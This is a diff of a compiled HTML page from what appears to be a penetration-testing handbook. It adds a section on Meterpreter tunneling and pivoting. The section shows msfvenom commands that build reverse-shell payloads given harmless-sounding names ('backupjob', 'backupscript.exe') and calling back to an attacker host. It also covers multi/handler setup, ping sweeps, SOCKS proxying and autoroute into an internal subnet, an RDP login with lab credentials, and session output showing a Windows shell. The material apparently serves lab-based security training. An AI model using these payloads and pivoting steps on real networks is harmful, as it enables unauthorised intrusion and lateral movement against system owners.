@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-7c9311b9.js";
+            window.path_to_searchindex_js = "searchindex-63b31448.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-59d553c9.js"></script>
+        <script src="toc-38b3d167.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -439,6 +439,7 @@
 <li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
 <li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
 <li><a href="#ssh-remotereverse-port-forwarding">SSH Remote Port Forwarding</a></li>
+<li><a href="#meterpreter-tunneling--port-forwarding">Meterpreter Tunneling &amp; Port Forwarding</a></li>
 </ul>
 </li>
 </ul>
@@ -22280,6 +22281,7 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 <li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
 <li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
 <li><a href="#ssh-remotereverse-port-forwarding">SSH Remote Port Forwarding</a></li>
+<li><a href="#meterpreter-tunneling--port-forwarding">Meterpreter Tunneling &amp; Port Forwarding</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="ssh-local-port-forwarding"><a class="header" href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></h1>
@@ -22603,6 +22605,172 @@ debug1: channel 1: connected to 0.0.0.0 port 8000
 <li>RDP clipboard disabled (need file transfer)</li>
 <li>Running exploits requiring Meterpreter session</li>
 <li>Enumeration requiring low-level Windows API access</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="meterpreter-tunneling--port-forwarding"><a class="header" href="#meterpreter-tunneling--port-forwarding">Meterpreter Tunneling &amp; Port Forwarding</a></h1>
+<p>Create pivots using Meterpreter sessions without relying on SSH port forwarding. Useful when you already have a Meterpreter shell on a pivot host and want to enumerate or exploit hosts on an internal network.</p>
+<h2 id="setting-up-the-meterpreter-session-on-the-pivot-host"><a class="header" href="#setting-up-the-meterpreter-session-on-the-pivot-host">Setting Up the Meterpreter Session on the Pivot Host</a></h2>
+<h3 id="step-1-create-payload-for-the-ubuntu-pivot-host"><a class="header" href="#step-1-create-payload-for-the-ubuntu-pivot-host">Step 1: Create Payload for the Ubuntu Pivot Host</a></h3>
+<pre><code class="language-bash">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+</code></pre>
+<h3 id="step-2-configure--start-the-multihandler"><a class="header" href="#step-2-configure--start-the-multihandler">Step 2: Configure &amp; Start the multi/handler</a></h3>
+<pre><code>msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
+msf6 exploit(multi/handler) &gt; set lport 8080
+msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; run
+</code></pre>
+<h3 id="step-3-execute-the-payload-on-the-pivot-host"><a class="header" href="#step-3-execute-the-payload-on-the-pivot-host">Step 3: Execute the Payload on the Pivot Host</a></h3>
+<p>Copy the binary to the pivot host over SSH and run it:</p>
+<pre><code class="language-bash">chmod +x backupjob
+./backupjob
+</code></pre>
+<p>Confirm the session is established:</p>
+<pre><code>[*] Sending stage (3020772 bytes) to 10.129.202.64
+[*] Meterpreter session 1 opened (10.10.14.18:8080 -&gt; 10.129.202.64:39826)
+meterpreter &gt; pwd
+/home/ubuntu
+</code></pre>
+<h2 id="ping-sweeps-through-the-pivot"><a class="header" href="#ping-sweeps-through-the-pivot">Ping Sweeps Through the Pivot</a></h2>
+<h3 id="using-meterpreters-ping_sweep-module"><a class="header" href="#using-meterpreters-ping_sweep-module">Using Meterpreter’s ping_sweep Module</a></h3>
+<pre><code>meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+</code></pre>
+<h3 id="ping-sweep-for-loop-on-linux-pivot-hosts"><a class="header" href="#ping-sweep-for-loop-on-linux-pivot-hosts">Ping Sweep For Loop on Linux Pivot Hosts</a></h3>
+<pre><code class="language-bash">for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &amp;) ;done
+</code></pre>
+<h3 id="ping-sweep-for-loop-using-cmd"><a class="header" href="#ping-sweep-for-loop-using-cmd">Ping Sweep For Loop Using CMD</a></h3>
+<pre><code class="language-cmd">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+</code></pre>
+<h3 id="ping-sweep-using-powershell"><a class="header" href="#ping-sweep-using-powershell">Ping Sweep Using PowerShell</a></h3>
+<pre><code class="language-powershell">1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> A ping sweep may not return results on the first attempt due to ARP cache build time. Run it at least twice. If ICMP is blocked by a firewall, use a TCP scan instead.</p>
+</blockquote>
+<h2 id="socks-proxy-with-metasploit-autoroute--proxychains"><a class="header" href="#socks-proxy-with-metasploit-autoroute--proxychains">SOCKS Proxy with Metasploit (AutoRoute + proxychains)</a></h2>
+<p>Instead of SSH dynamic port forwarding, use Metasploit’s <code>socks_proxy</code> module to create a local SOCKS proxy that routes traffic through the Meterpreter session.</p>
+<h3 id="step-1-configure-msfs-socks-proxy"><a class="header" href="#step-1-configure-msfs-socks-proxy">Step 1: Configure MSF’s SOCKS Proxy</a></h3>
+<pre><code>msf6 &gt; use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050
+msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0
+msf6 auxiliary(server/socks_proxy) &gt; set version 4a
+msf6 auxiliary(server/socks_proxy) &gt; run
+</code></pre>
+<p>Confirm the proxy is running:</p>
+<pre><code>msf6 auxiliary(server/socks_proxy) &gt; jobs
+
+Jobs
+====
+
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  0   Auxiliary: server/socks_proxy
+</code></pre>
+<h3 id="step-2-configure-proxychains"><a class="header" href="#step-2-configure-proxychains">Step 2: Configure proxychains</a></h3>
+<p>Add (or verify) this line at the end of <code>/etc/proxychains.conf</code>:</p>
+<pre><code>socks4  127.0.0.1 9050
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> Depending on the SOCKS server version, you may need to change <code>socks4</code> to <code>socks5</code>.</p>
+</blockquote>
+<h3 id="step-3-create-routes-with-autoroute"><a class="header" href="#step-3-create-routes-with-autoroute">Step 3: Create Routes with AutoRoute</a></h3>
+<p><strong>Option A: Using the post module</strong></p>
+<pre><code>msf6 &gt; use post/multi/manage/autoroute
+msf6 post(multi/manage/autoroute) &gt; set SESSION 1
+msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0
+msf6 post(multi/manage/autoroute) &gt; run
+</code></pre>
+<p><strong>Option B: From the Meterpreter session directly</strong></p>
+<pre><code>meterpreter &gt; run autoroute -s 172.16.5.0/23
+</code></pre>
+<h3 id="step-4-verify-active-routes"><a class="header" href="#step-4-verify-active-routes">Step 4: Verify Active Routes</a></h3>
+<pre><code>meterpreter &gt; run autoroute -p
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.129.0.0         255.255.0.0        Session 1
+   172.16.4.0         255.255.254.0      Session 1
+   172.16.5.0         255.255.254.0      Session 1
+</code></pre>
+<h3 id="step-5-test-proxy--routing"><a class="header" href="#step-5-test-proxy--routing">Step 5: Test Proxy &amp; Routing</a></h3>
+<pre><code class="language-bash">proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+</code></pre>
+<p>Example output:</p>
+<pre><code>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK
+Discovered open port 3389/tcp on 172.16.5.19
+</code></pre>
+<h2 id="meterpreter-port-forwarding-portfwd"><a class="header" href="#meterpreter-port-forwarding-portfwd">Meterpreter Port Forwarding (portfwd)</a></h2>
+<p>Use Meterpreter’s <code>portfwd</code> module to forward ports through the session without needing proxychains.</p>
+<h3 id="portfwd-options"><a class="header" href="#portfwd-options">portfwd Options</a></h3>
+<pre><code>meterpreter &gt; help portfwd
+
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+
+OPTIONS:
+
+    -h        Help banner.
+    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the "list" command).
+    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.
+    -L &lt;opt&gt;  Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r &lt;opt&gt;  Forward: remote host to connect to.
+    -R        Indicates a reverse port forward.
+</code></pre>
+<h3 id="creating-a-local-tcp-relay"><a class="header" href="#creating-a-local-tcp-relay">Creating a Local TCP Relay</a></h3>
+<p>Forward local port 3300 to the Windows target’s RDP port:</p>
+<pre><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19
+[*] Local TCP relay created: :3300 &lt;-&gt; 172.16.5.19:3389
+</code></pre>
+<p>Then connect via RDP through the forwarded port:</p>
+<pre><code class="language-bash">xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+</code></pre>
+<p>Verify with netstat:</p>
+<pre><code class="language-bash">netstat -antp
+# tcp   0   0 127.0.0.1:54652   127.0.0.1:3300   ESTABLISHED 4075/xfreerdp
+</code></pre>
+<h2 id="meterpreter-reverse-port-forwarding"><a class="header" href="#meterpreter-reverse-port-forwarding">Meterpreter Reverse Port Forwarding</a></h2>
+<p>Use reverse port forwarding when you want a compromised host on the internal network to send a shell back through the pivot host to your attack host.</p>
+<h3 id="step-1-create-reverse-port-forward-rule"><a class="header" href="#step-1-create-reverse-port-forward-rule">Step 1: Create Reverse Port Forward Rule</a></h3>
+<p>From the Meterpreter session on the pivot host, forward all connections received on port 1234 to your attack host on port 8081:</p>
+<pre><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234
+</code></pre>
+<h3 id="step-2-configure--start-multihandler-for-windows"><a class="header" href="#step-2-configure--start-multihandler-for-windows">Step 2: Configure &amp; Start multi/handler for Windows</a></h3>
+<pre><code>meterpreter &gt; bg
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LPORT 8081
+msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0
+msf6 exploit(multi/handler) &gt; run
+</code></pre>
+<h3 id="step-3-generate-the-windows-payload"><a class="header" href="#step-3-generate-the-windows-payload">Step 3: Generate the Windows Payload</a></h3>
+<p>The payload connects back to the pivot host (not directly to the attack host):</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+</code></pre>
+<h3 id="step-4-execute-the-payload-on-the-windows-target"><a class="header" href="#step-4-execute-the-payload-on-the-windows-target">Step 4: Execute the Payload on the Windows Target</a></h3>
+<p>Once the payload runs on the Windows host, the connection flows:</p>
+<pre><code>Windows (172.16.5.19:1234) → Pivot (172.16.5.129:1234) → SSH/Meterpreter → Attack Host (10.10.14.18:8081)
+</code></pre>
+<p>Confirm the session:</p>
+<pre><code>[*] Started reverse TCP handler on 0.0.0.0:8081
+[*] Sending stage (200262 bytes) to 10.10.14.18
+[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173)
+
+meterpreter &gt; shell
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\&gt;
+</code></pre>
+<h2 id="when-to-use-3"><a class="header" href="#when-to-use-3">When to Use</a></h2>
+<ul>
+<li>Already have a Meterpreter session on the pivot host</li>
+<li>Need SOCKS proxy routing without SSH access</li>
+<li>Want to forward specific ports through the pivot (portfwd)</li>
+<li>Need reverse port forwarding for internal hosts that cannot reach the attack host directly</li>
+<li>Prefer Metasploit’s integrated tooling over manual SSH tunnels</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
